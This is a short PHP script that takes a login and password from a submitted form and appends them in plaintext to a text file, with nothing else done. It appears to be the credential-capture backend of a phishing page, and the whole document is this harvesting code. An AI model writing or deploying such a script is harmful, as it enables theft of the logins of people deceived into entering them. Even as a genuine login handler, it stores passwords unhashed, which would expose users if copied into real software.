<?php
$login = $_POST['login'];
$password = $_POST['password'];
$file = fopen("file.txt","a+");
fwrite($file,"\n $login:$password \n");
fclose($file);
?>
